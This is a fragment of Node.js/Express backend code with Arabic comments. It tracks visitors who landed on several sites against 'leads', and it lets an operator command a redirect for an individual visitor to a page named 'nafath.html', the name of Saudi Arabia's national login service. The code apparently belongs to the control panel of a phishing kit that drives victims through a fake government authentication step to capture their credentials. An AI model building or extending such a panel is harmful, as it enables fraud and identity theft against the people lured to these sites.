...
// 📊 إحصائيات المراقبة: الزوار الذين هبطوا على الموقع (كل الزوار) مقابل الذين سجّلوا
router.get('/stats', requireAuth, async (req, res) => {
    try {
        const targetSites = resolveAllowedSites(req.user, req.query.sites);
        const base = {};
        if (targetSites.length > 0) {
            base.siteKey = { $in: targetSites };
        } else if (req.user.role !== 'admin') {
            return res.json({ landed: 0, leads: 0, online: 0, blocked: 0 });
        }
        ...
        const [landed, leads, online, blocked] = await Promise.all([
            Visitor.countDocuments(base),
            Visitor.countDocuments(leadsFilter),
            Visitor.countDocuments({ ...base, lastSeen: { $gte: timeLimit } }),
            Visitor.countDocuments({ ...base, isBlocked: true })
        ]);

        res.json({ landed, leads, online, blocked });
    } catch {
...
router.post('/command', requireAuth, async (req, res) => {
    try {
        ...
        if (command === 'redirect') {
            ...
            visitor.redirectStatus = 'pending';
            ...
            visitor.status = 'go';
            visitor.redirectUrl = 'nafath.html?_r=' + Date.now();
